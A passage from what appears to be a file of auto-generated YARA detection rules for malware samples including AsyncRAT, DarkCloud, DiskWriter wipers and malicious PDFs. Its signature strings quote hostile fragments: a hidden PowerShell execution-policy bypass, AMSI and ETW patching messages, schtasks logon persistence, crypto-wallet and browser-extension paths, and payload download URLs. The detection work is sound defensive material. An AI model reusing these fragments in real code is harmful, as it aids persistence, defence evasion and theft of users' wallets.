      $s7 = "EAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                            ' */ /* score: '16.50'*/
      $s8 = "AAAAAAABAAAAAAAAAAAAAAAC" ascii /* base64 encoded string '     @           ' */ /* score: '16.50'*/
      $s9 = "AABAAAAAAAAAAEAAAAAAAAAAC" ascii /* base64 encoded string '  @       @       ' */ /* score: '16.50'*/
      $s10 = "AAAAAAAAAAAAAAAAAAAAC" ascii /* base64 encoded string '               ' */ /* score: '16.50'*/
      $s11 = "ADAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string ' 0                                                                                                                                                                ' */ /* score: '16.50'*/
      $s12 = "AAAAAAAAAEAAAAA" ascii /* base64 encoded string '       @   ' */ /* score: '16.50'*/
      $s13 = "AAAAAAAAAC" ascii /* base64 encoded string '       ' */ /* score: '16.50'*/
      $s14 = "AABAAABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAA" ascii /* base64 encoded string '  @  @    @  @      @          ' */ /* score: '16.50'*/
      $s15 = "AAAAAAAAAAAAAAAAAABAAABA" ascii /* base64 encoded string '              @  @' */ /* score: '16.50'*/
   condition:
      uint16(0) == 0x6877 and filesize < 3000KB and
      8 of them
}

rule dae02f32a21e03ce65412f6e56942daa_imphash__6ae546da {
   meta:
      description = "_subset_batch - file dae02f32a21e03ce65412f6e56942daa(imphash)_6ae546da.dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "6ae546da4d6d78d4262f3a2ff5e4f58c345294383ed9ff5e4daa52466fe79e2f"
   strings:
      $x1 = "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -Command \"\"function Invocation{param($f1,$f2)[System.Reflection.Assembl" wide /* score: '62.00'*/
      $x2 = "C:\\Users\\Public\\Ab.vbs" fullword wide /* score: '34.00'*/
      $s3 = "C:\\Users\\ASUS\\Desktop\\Obfuscator\\Obfuscator\\obj\\Debug\\Obfuscator.pdb" fullword ascii /* score: '29.00'*/
      $s4 = "Get-Process" fullword wide /* score: '20.00'*/
      $s5 = "Obfuscator.dll" fullword wide /* score: '19.00'*/
      $s6 = "[-] Failed to get AmsiInitialize address." fullword wide /* score: '19.00'*/
      $s7 = "[-] Failed to get EtwEventWrite address." fullword wide /* score: '19.00'*/
      $s8 = "get_LogonType" fullword ascii /* score: '17.00'*/
      $s9 = "CreateLoginTask" fullword ascii /* score: '15.00'*/
      $s10 = "CreateObject(\"Wscript.Shell\").Run \"" fullword wide /* score: '15.00'*/
      $s11 = "InjectPS" fullword ascii /* score: '14.00'*/
      $s12 = "set_LogonType" fullword ascii /* score: '12.00'*/
      $s13 = "ILogonTrigger" fullword ascii /* score: '12.00'*/
      $s14 = "[-] AmsiInitialize failed." fullword wide /* score: '11.00'*/
      $s15 = "[-] VirtualProtect failed on AMSI function" fullword wide /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 50KB and
      1 of ($x*) and 4 of them
}

rule DarkCloud_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__28744445 {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_28744445.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "287444454d9a7a0028fc26569b08ac4bed7fb39469bef19304a9df70f06447c0"
   strings:
      $s1 = "Gzhncreuoo.exe" fullword wide /* score: '22.00'*/
      $s2 = "InvokeTargetMethod" fullword ascii /* score: '18.00'*/
      $s3 = "ExecuteSynchronousFlow" fullword ascii /* score: '18.00'*/
      $s4 = "https://www.arcon.com.pe/Yguuoxoo.mp4" fullword wide /* score: '17.00'*/
      $s5 = "ExecutionFlowController" fullword ascii /* score: '16.00'*/
      $s6 = "CryptographicProcessor" fullword ascii /* score: '15.00'*/
      $s7 = "AssemblyExecutionEngine" fullword ascii /* score: '12.00'*/
      $s8 = ".NET Framework 4.6" fullword ascii /* score: '10.00'*/
      $s9 = "encryptionIv" fullword ascii /* score: '9.00'*/
      $s10 = "TransformEncryptedData" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20KB and
      all of them
}

rule DarkCloud_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash_ {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "1b0f31fc0bee9431ddc39bb82fb484141d387f8a2c8f5d8863b20af397ea7736"
   strings:
      $s1 = "Hcsjbo.exe" fullword wide /* score: '22.00'*/
      $s2 = "https://www.arcon.com.pe/Lhaiub.mp4" fullword wide /* score: '17.00'*/
      $s3 = ".NET Framework 4.6" fullword ascii /* score: '10.00'*/
      $s4 = "SmartAssembly.Attributes" fullword ascii /* PEStudio Blacklist: strings */ /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 20KB and
      all of them
}

rule DarkCloud_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__5a8f5339 {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5a8f5339.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5a8f533923e9593790f6c8271c261496eff6bd28b4be1982aeb0e9fd92cba380"
   strings:
      $s1 = "Uehsmkb.exe" fullword wide /* score: '22.00'*/
      $s2 = ".NET Framework 4.6" fullword ascii /* score: '10.00'*/
      $s3 = "Uehsmkb.Threading" fullword ascii /* score: '10.00'*/
      $s4 = "get_Dpwpeqp" fullword ascii /* score: '9.00'*/
      $s5 = "m_OperationalState" fullword ascii /* score: '9.00'*/
      $s6 = "* ;/S[" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 3000KB and
      all of them
}

rule DarkCloud_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__fafb2792 {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_fafb2792.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "fafb279267341316da74ca14e296523a68736c3e7ca6ac96b7ba788a22b30882"
   strings:
      $s1 = "Kfmngiidyh.exe" fullword wide /* score: '22.00'*/
      $s2 = ".NET Framework 4.6" fullword ascii /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      all of them
}

rule AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__59a444ec {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_59a444ec.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "59a444ece99a4f0c95a934fd2bdc35f0e787652eba99b386a86f86075d0e3e45"
   strings:
      $s1 = "/c schtasks /create /f /sc onlogon /rl highest /tn \"" fullword wide /* score: '23.00'*/
      $s2 = "AsyncClient.exe" fullword ascii /* score: '22.00'*/
      $s3 = "\\AppData\\Roaming\\atomic\\Cookies" fullword wide /* score: '18.00'*/
      $s4 = "\\Log.tmp" fullword wide /* score: '17.00'*/
      $s5 = "\\AppData\\Roaming\\binance\\Preferences" fullword wide /* score: '17.00'*/
      $s6 = "MutexControl" fullword ascii /* score: '15.00'*/
      $s7 = "\\AppData\\Roaming\\Exodus\\exodus.conf.json" fullword wide /* score: '15.00'*/
      $s8 = "\\AppData\\Roaming\\Ledger Live\\app.json" fullword wide /* score: '15.00'*/
      $s9 = "\\AppData\\Roaming\\@trezor\\suite-desktop\\config.json" fullword wide /* score: '15.00'*/
      $s10 = "WHKEYBOARDLL" fullword ascii /* score: '14.50'*/
      $s11 = "LimeLogger" fullword ascii /* score: '14.00'*/
      $s12 = "loggerPath" fullword ascii /* score: '14.00'*/
      $s13 = "TjBtcXNDYTV5RDJSRlhDbExFNGNrdHYyT1NsMlBmTkg=" fullword wide /* base64 encoded string 'N0mqsCa5yD2RFXClLE4cktv2OSl2PfNH' */ /* score: '14.00'*/
      $s14 = "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm\\LOCK" fullword wide /* score: '14.00'*/
      $s15 = "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Profile 1\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm\\LOCK" fullword wide /* score: '14.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__3236599f {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_3236599f.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3236599f0507dd5fb205a7663363b0e37f6f6f3c5756672797505af9bb3546ad"
   strings:
      $s1 = "/c schtasks /create /f /sc onlogon /rl highest /tn \"" fullword wide /* score: '23.00'*/
      $s2 = "iGjvfmSAiIr80EdRf1xAqVI4xeeDELybqwTdpJAHjLfFVaqYsU1ibZIDVtNWm+s9dMJirCNLk8s/0Sk0HACQ6EbRLW8wJ4tpG4qkSfcco0SM5+BADiF82tFfU6yoWPcu" wide /* score: '23.00'*/
      $s3 = "Stub.exe" fullword wide /* score: '22.00'*/
      $s4 = "raw file 2.exe" fullword ascii /* score: '19.00'*/
      $s5 = "MutexControl" fullword ascii /* score: '15.00'*/
      $s6 = "/yir2BcdPhfRc35us8zQcsI6/cB05UeWo6zV2ZL0EGKd4CZb2+JM/fF+o7YpnyNqmGsAiykt4VVyyUiC7zioXSKTJfQnvUfUtbEYz8sRXdd83vSHb+wR5YKqcquJNc6k" wide /* score: '15.00'*/
      $s7 = "V2hJbmNIdTE1MjlpU0Q2eHhvVlk5eThWNk05T2llMkQ=" fullword wide /* base64 encoded string 'WhIncHu1529iSD6xxoVY9y8V6M9Oie2D' */ /* score: '14.00'*/
      $s8 = "    <asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">" fullword ascii /* score: '12.00'*/
      $s9 = "_authKey" fullword ascii /* score: '10.00'*/
      $s10 = "Client.Connection" fullword ascii /* score: '10.00'*/
      $s11 = "AuthKeyLength" fullword ascii /* score: '10.00'*/
      $s12 = "GetAsUInt64" fullword ascii /* score: '10.00'*/
      $s13 = "GetAsInteger" fullword ascii /* score: '9.00'*/
      $s14 = "GetUtf8Bytes" fullword ascii /* score: '9.00'*/
      $s15 = "GetAsFloat" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      8 of them
}

rule AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__5f6117a5 {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_5f6117a5.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "5f6117a5f11d3c99e7dfafc65d1535c3843bccde909eaa955af219a74b22ad27"
   strings:
      $s1 = "/c schtasks /create /f /sc onlogon /rl highest /tn \"" fullword wide /* score: '23.00'*/
      $s2 = "Stub.exe" fullword wide /* score: '22.00'*/
      $s3 = "winserver.exe" fullword wide /* score: '22.00'*/
      $s4 = "HWID GUARD.exe" fullword ascii /* score: '19.00'*/
      $s5 = "MutexControl" fullword ascii /* score: '15.00'*/
      $s6 = "dUxNSGRyYzlzeGt2dUJib2JMbXVsdlRhdUNTRkNGWEk=" fullword wide /* base64 encoded string 'uLMHdrc9sxkvuBbobLmulvTauCSFCFXI' */ /* score: '14.00'*/
      $s7 = "    <asmv3:windowsSettings xmlns=\"http://schemas.microsoft.com/SMI/2005/WindowsSettings\">" fullword ascii /* score: '12.00'*/
      $s8 = "_authKey" fullword ascii /* score: '10.00'*/
      $s9 = "Client.Connection" fullword ascii /* score: '10.00'*/
      $s10 = "AuthKeyLength" fullword ascii /* score: '10.00'*/
      $s11 = "GetAsUInt64" fullword ascii /* score: '10.00'*/
      $s12 = "n6tuozAl4paBCBwNexL4B4bRXsUJEGPdgvgsYoVRWHJjoLqtxZpPyAo5UjY5KrpeyNG8PZJchDE5nIK8LI4XNsgJkMo4RG5I+raSUE3Gl6BV39v7ox6pTom5ZBbHNc4t" wide /* score: '10.00'*/
      $s13 = "LnELr+E/zUX/NU4RCWLtrPcueoY4p5e/T0IfSTAHzT0NI+LbGY0z6/IzvkltVN+BGjis+TOKCMPFcNYpNUKUI3lzbnzcsIGqtfie3DEQwfcKlv/VaxS2TASBcuqpLGS1" wide /* score: '10.00'*/
      $s14 = "GetAsInteger" fullword ascii /* score: '9.00'*/
      $s15 = "GetUtf8Bytes" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      8 of them
}

rule dae02f32a21e03ce65412f6e56942daa_imphash_ {
   meta:
      description = "_subset_batch - file dae02f32a21e03ce65412f6e56942daa(imphash).dll"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "dd1a9c046254608a7df0eb5b8993880e3d97cc889b4aa8ac857206e5cbd3f67b"
   strings:
      $s1 = "5upwjewi.dll" fullword wide /* score: '23.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 9KB and
      all of them
}

rule CoinMiner_signature__7782f8f3 {
   meta:
      description = "_subset_batch - file CoinMiner(signature)_7782f8f3.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "7782f8f322c6e591ea08da0ba14eb7363cf1616625f96d831bb448b7f0184c7a"
   strings:
      $s1 = "Zejvm.exe" fullword wide /* score: '22.00'*/
      $s2 = "get_Ixfxjdppeq" fullword ascii /* score: '9.00'*/
      $s3 = "TestOperationalTester" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule ba2544359bccdb568da3816e39faff9e7697a6828192eb4f22eb266ee6f05c0a_ba254435 {
   meta:
      description = "_subset_batch - file ba2544359bccdb568da3816e39faff9e7697a6828192eb4f22eb266ee6f05c0a_ba254435.pdf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ba2544359bccdb568da3816e39faff9e7697a6828192eb4f22eb266ee6f05c0a"
   strings:
      $s1 = "/URI (http://myftpupload.com)" fullword ascii /* score: '24.00'*/
      $s2 = "<rdf:Description xmlns:pdf=\"http://ns.adobe.com/pdf/1.3/\">" fullword ascii /* score: '23.00'*/
      $s3 = "<rdf:Description xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\">" fullword ascii /* score: '23.00'*/
      $s4 = "/URI (http://robinhantersisgood2.blogspot.com)" fullword ascii /* score: '22.00'*/
      $s5 = "/URI (http://mceinsurance.com)" fullword ascii /* score: '17.00'*/
      $s6 = "/URI (http://lilwaynehq.com)" fullword ascii /* score: '17.00'*/
      $s7 = "/URI (http://defenceforumindia.com)" fullword ascii /* score: '17.00'*/
      $s8 = "/URI (http://hanatutorials.com)" fullword ascii /* score: '17.00'*/
      $s9 = "/URI (http://inkedmag.com)" fullword ascii /* score: '17.00'*/
      $s10 = "/URI (http://mmopulse.com)" fullword ascii /* score: '17.00'*/
      $s11 = "/URI (http://8hdporn.com)" fullword ascii /* score: '17.00'*/
      $s12 = "/URI (http://wageworks.com)" fullword ascii /* score: '17.00'*/
      $s13 = "/URI (http://roomsketcher.com)" fullword ascii /* score: '17.00'*/
      $s14 = "/URI (http://tipsfound.com)" fullword ascii /* score: '17.00'*/
      $s15 = "/URI (http://anerbarrena.com)" fullword ascii /* score: '17.00'*/
   condition:
      uint16(0) == 0x5025 and filesize < 200KB and
      8 of them
}

rule ba901ccdf797dde0b23edf731adb4ade659450782f138f8f505c7e290f9cede5_ba901ccd {
   meta:
      description = "_subset_batch - file ba901ccdf797dde0b23edf731adb4ade659450782f138f8f505c7e290f9cede5_ba901ccd.pdf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "ba901ccdf797dde0b23edf731adb4ade659450782f138f8f505c7e290f9cede5"
   strings:
      $s1 = "<</Title(Slide 14: Common Criteria process) /Parent 276 0 R/Dest[ 130 0 R/XYZ 0 0 0] /Prev 278 0 R/Next 280 0 R>>" fullword ascii /* score: '24.00'*/
      $s2 = "<rdf:Description rdf:about=\"\"  xmlns:pdf=\"http://ns.adobe.com/pdf/1.3/\">" fullword ascii /* score: '23.00'*/
      $s3 = "<rdf:Description rdf:about=\"\"  xmlns:xmpMM=\"http://ns.adobe.com/xap/1.0/mm/\">" fullword ascii /* score: '23.00'*/
      $s4 = "<rdf:Description rdf:about=\"\"  xmlns:xmp=\"http://ns.adobe.com/xap/1.0/\">" fullword ascii /* score: '23.00'*/
      $s5 = "<</Title(Slide 33: Kerberos process) /Parent 298 0 R/Dest[ 199 0 R/XYZ 0 0 0] /Prev 299 0 R/Next 301 0 R>>" fullword ascii /* score: '22.00'*/
      $s6 = "<</Title(Slide 42: Incident Response Process) /Parent 308 0 R/Dest[ 238 0 R/XYZ 0 0 0] /Prev 310 0 R/Next 312 0 R>>" fullword ascii /* score: '19.00'*/
      $s7 = "<</Title(Slide 6: The BIA Process) /Parent 263 0 R/Dest[ 93 0 R/XYZ 0 0 0] /Prev 268 0 R/Next 270 0 R>>" fullword ascii /* score: '19.00'*/
      $s8 = "22222222222222222222222222222222222222222222222222" ascii /* score: '17.00'*/ /* hex encoded string '"""""""""""""""""""""""""' */
      $s9 = "<rdf:Description rdf:about=\"\"  xmlns:dc=\"http://purl.org/dc/elements/1.1/\">" fullword ascii /* score: '16.00'*/
      $s10 = "<</Title(Slide 29: Common ports) /Parent 288 0 R/Dest[ 189 0 R/XYZ 0 0 0] /Prev 294 0 R/Next 296 0 R>>" fullword ascii /* score: '16.00'*/
      $s11 = "<</Type/XRef/Size 3326/W[ 1 4 2] /Root 1 0 R/Info 261 0 R/ID[<D5713B4943228F48828B767FE850EAEF><D5713B4943228F48828B767FE850EAEF" ascii /* score: '15.00'*/
      $s12 = "<</Title(Slide 27: Private IPv4 addresses) /Parent 288 0 R/Dest[ 185 0 R/XYZ 0 0 0] /Prev 292 0 R/Next 294 0 R>>" fullword ascii /* score: '14.00'*/
      $s13 = "QQQQQX" fullword ascii /* reversed goodware string 'XQQQQQ' */ /* score: '13.50'*/
      $s14 = "<</Type/Page/Parent 2 0 R/Resources<</ExtGState<</GS5 5 0 R/GS73 73 0 R/GS8 8 0 R>>/XObject<</Image61 61 0 R/Image63 63 0 R/Imag" ascii /* score: '13.00'*/
      $s15 = "geC/ImageI] >>/MediaBox[ 0 0 720 405.36] /Contents 131 0 R/Group<</Type/Group/S/Transparency/CS/DeviceRGB>>/Tabs/S/StructParents" ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x5025 and filesize < 7000KB and
      8 of them
}

rule DarkCloud_signature__3ed5fe15 {
   meta:
      description = "_subset_batch - file DarkCloud(signature)_3ed5fe15.xlsx"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "3ed5fe15f2a5eac7289b0e7d663e38a7e07e56ee722c85a6be95924a54298f4e"
   strings:
      $s1 = "*\\G{2DF8D04C-5BFA-101B-BDE5-00AA0044DE52}#2.4#0#C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\OFFICE12\\MSO.DLL#Micr" wide /* score: '28.00'*/
      $s2 = "https://getabre.com/W4B4T3" fullword wide /* score: '22.00'*/
      $s3 = "*\\G{000204EF-0000-0000-C000-000000000046}#4.0#9#C:\\PROGRA~2\\COMMON~1\\MICROS~1\\VBA\\VBA6\\VBE6.DLL#Visual Basic For Applicat" wide /* score: '21.00'*/
      $s4 = "*\\G{00020813-0000-0000-C000-000000000046}#1.6#0#C:\\Program Files (x86)\\Microsoft Office\\Office12\\EXCEL.EXE#Microsoft Excel " wide /* score: '17.00'*/
      $s5 = "*\\G{00020430-0000-0000-C000-000000000046}#2.0#0#C:\\Windows\\SysWOW64\\stdole2.tlb#OLE Automation" fullword wide /* score: '13.00'*/
   condition:
      uint16(0) == 0xcfd0 and filesize < 1000KB and
      all of them
}

rule c8eaef5e507a4694d36c6f617693972269879d3b832702d60d1fc4e6e4046101_c8eaef5e {
   meta:
      description = "_subset_batch - file c8eaef5e507a4694d36c6f617693972269879d3b832702d60d1fc4e6e4046101_c8eaef5e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c8eaef5e507a4694d36c6f617693972269879d3b832702d60d1fc4e6e4046101"
   strings:
      $s1 = "  <!-- Enable themes for Windows common controls and dialogs (Windows XP and later) -->" fullword ascii /* score: '25.00'*/
      $s2 = "librenpython.dll" fullword wide /* score: '23.00'*/
      $s3 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p." fullword ascii /* score: '12.50'*/
      $s4 = "runtime error %d" fullword ascii /* score: '10.00'*/
      $s5 = "Version Not Supported" fullword wide /* score: '10.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 300KB and
      all of them
}

rule DiskWriter_signature__321b9daa782c2c74730b081aebf77550_imphash_ {
   meta:
      description = "_subset_batch - file DiskWriter(signature)_321b9daa782c2c74730b081aebf77550(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "48a98f43a482d85595c0c3d8189f0c38cf96fc9a31320cd4ac06e68aca70b674"
   strings:
      $s1 = "xzhgowbweivqm.exe" fullword wide /* score: '22.00'*/
      $s2 = "D:\\Visual Studio Projects\\xzhgowbweivqm.exe-sourcecode\\xzhgowbweivqm-safety\\x64\\Release\\xzhgowbweivqm-safety.pdb" fullword ascii /* score: '19.00'*/
      $s3 = "Executioner" fullword ascii /* score: '18.00'*/
      $s4 = "YOUR MALWARES ARE ASS!!!" fullword ascii /* score: '13.00'*/
      $s5 = "Safety version. this will not do anything to your system" fullword wide /* score: '10.00'*/
      $s6 = "666.666.666.666" fullword wide /* score: '9.00'*/ /* hex encoded string 'ffffff' */
      $s7 = "I LOVE YOU EXECUTIONER CAN U MARRY ME" fullword ascii /* score: '8.00'*/
      $s8 = "xzhgowbweivqm" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      all of them
}

rule DiskWriter_signature__6aaf7a58c072edc43c04c6412554d8ee_imphash_ {
   meta:
      description = "_subset_batch - file DiskWriter(signature)_6aaf7a58c072edc43c04c6412554d8ee(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "459703c0474b07fb6d05ec6e064a9725f521fa281276e0ea29ae6a7189926ef5"
   strings:
      $s1 = "xzhgowbweivqm.exe" fullword wide /* score: '22.00'*/
      $s2 = "D:\\Visual Studio Projects\\xzhgowbweivqm.exe-sourcecode\\xzhgowbweivqm-safety\\Release\\xzhgowbweivqm-safety.pdb" fullword ascii /* score: '19.00'*/
      $s3 = "Executioner" fullword ascii /* score: '18.00'*/
      $s4 = "YOUR MALWARES ARE ASS!!!" fullword ascii /* score: '13.00'*/
      $s5 = "Safety version. this will not do anything to your system" fullword wide /* score: '10.00'*/
      $s6 = "666.666.666.666" fullword wide /* score: '9.00'*/ /* hex encoded string 'ffffff' */
      $s7 = "I LOVE YOU EXECUTIONER CAN U MARRY ME" fullword ascii /* score: '8.00'*/
      $s8 = "xzhgowbweivqm" fullword wide /* score: '8.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      all of them
}

rule DiskWriter_signature__932c345948705ac3b81bfdf58931e5a9_imphash_ {
   meta:
      description = "_subset_batch - file DiskWriter(signature)_932c345948705ac3b81bfdf58931e5a9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "e99435c0209fc79941ef34320c8094b44a08f33bb017c7285068fc53cfbde758"
   strings:
      $s1 = "api-ms-win-core-synch-l1-2-0.dll" fullword wide /* reversed goodware string 'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */ /* score: '30.00'*/
      $s2 = "xzhgowbweivqm.exe by Executioner" fullword wide /* score: '26.00'*/
      $s3 = "/f /im explorer.exe" fullword ascii /* score: '23.00'*/
      $s4 = "xzhgowbweivqm.exe" fullword wide /* score: '22.00'*/
      $s5 = "xzhgowbweivqm.exe - LAST CHANCE" fullword wide /* score: '22.00'*/
      $s6 = "D:\\Visual Studio Projects\\xzhgowbweivqm.exe-sourcecode\\xzhgowbweivqm\\Release\\xzhgowbweivqm.pdb" fullword ascii /* score: '19.00'*/
      $s7 = "Executioner" fullword ascii /* score: '18.00'*/
      $s8 = "!!!!++3&7" fullword ascii /* score: '14.00'*/ /* hex encoded string '7' */
      $s9 = "Task Manager, Registry Editor and Command Prompt will be disabled and your PC will no longer boot." fullword wide /* score: '14.00'*/
      $s10 = "YOUR MALWARES ARE ASS!!!" fullword ascii /* score: '13.00'*/
      $s11 = "taskkill" fullword ascii /* score: '12.00'*/
      $s12 = "        <requestedExecutionLevel level='requireAdministrator' uiAccess='false' />" fullword ascii /* score: '11.00'*/
      $s13 = "111---" fullword ascii /* reversed goodware string '---111' */ /* score: '11.00'*/
      $s14 = "Time is up. Your system is now destroyed by the malware. Thank you for making a dumb choice user!" fullword ascii /* score: '10.00'*/
      $s15 = "666.666.666.666" fullword wide /* score: '9.00'*/ /* hex encoded string 'ffffff' */
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      8 of them
}

rule DiskWriter_signature__f25d11f395e9d534679e1baacca5e3f9_imphash_ {
   meta:
      description = "_subset_batch - file DiskWriter(signature)_f25d11f395e9d534679e1baacca5e3f9(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "287dddb587eaa34facf4798e1a9867c05b6f50dd22d81527848697fea944e932"
   strings:
      $s1 = "api-ms-win-core-synch-l1-2-0.dll" fullword wide /* reversed goodware string 'lld.0-2-1l-hcnys-eroc-niw-sm-ipa' */ /* score: '30.00'*/
      $s2 = "xzhgowbweivqm.exe by Executioner" fullword wide /* score: '26.00'*/
      $s3 = "/f /im explorer.exe" fullword ascii /* score: '23.00'*/
      $s4 = "xzhgowbweivqm.exe" fullword wide /* score: '22.00'*/
      $s5 = "xzhgowbweivqm.exe - LAST CHANCE" fullword wide /* score: '22.00'*/
      $s6 = "D:\\Visual Studio Projects\\xzhgowbweivqm.exe-sourcecode\\xzhgowbweivqm\\x64\\Release\\xzhgowbweivqm.pdb" fullword ascii /* score: '19.00'*/
      $s7 = "Executioner" fullword ascii /* score: '18.00'*/
      $s8 = "!!!!++3&7" fullword ascii /* score: '14.00'*/ /* hex encoded string '7' */
      $s9 = "Task Manager, Registry Editor and Command Prompt will be disabled and your PC will no longer boot." fullword wide /* score: '14.00'*/
      $s10 = "YOUR MALWARES ARE ASS!!!" fullword ascii /* score: '13.00'*/
      $s11 = "taskkill" fullword ascii /* score: '12.00'*/
      $s12 = "        <requestedExecutionLevel level='requireAdministrator' uiAccess='false' />" fullword ascii /* score: '11.00'*/
      $s13 = "111---" fullword ascii /* reversed goodware string '---111' */ /* score: '11.00'*/
      $s14 = "Time is up. Your system is now destroyed by the malware. Thank you for making a dumb choice user!" fullword ascii /* score: '10.00'*/
      $s15 = "666.666.666.666" fullword wide /* score: '9.00'*/ /* hex encoded string 'ffffff' */
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      8 of them
}

rule c3e6a9cdad201f521c14c0f5966e73cf05d2390503956933854024d2b4bd8fcb_c3e6a9cd {
   meta:
      description = "_subset_batch - file c3e6a9cdad201f521c14c0f5966e73cf05d2390503956933854024d2b4bd8fcb_c3e6a9cd.sys"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c3e6a9cdad201f521c14c0f5966e73cf05d2390503956933854024d2b4bd8fcb"
   strings:
      $s1 = "ACEDriver.sys" fullword ascii /* score: '25.00'*/
      $s2 = "Nhttp://www.microsoft.com/pkiops/crl/Microsoft%20Time-Stamp%20PCA%202010(1).crl0l" fullword ascii /* score: '13.00'*/
      $s3 = "Phttp://www.microsoft.com/pkiops/certs/Microsoft%20Time-Stamp%20PCA%202010(1).crt0" fullword ascii /* score: '13.00'*/
      $s4 = "$Microsoft Ireland Operations Limited1'0%" fullword ascii /* score: '11.00'*/
      $s5 = "$Microsoft Ireland Operations Limited1" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 500KB and
      all of them
}

rule AsyncRAT_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__c0ef405a {
   meta:
      description = "_subset_batch - file AsyncRAT(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_c0ef405a.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c0ef405adacaa82f0407c967d720f896d3512f6a16138492d7bc7a9fe18c0959"
   strings:
      $s1 = "driverwinxp.exe" fullword wide /* score: '25.00'*/
      $s2 = "/c schtasks /create /f /sc onlogon /rl highest /tn \"" fullword wide /* score: '23.00'*/
      $s3 = "Stub.exe" fullword wide /* score: '22.00'*/
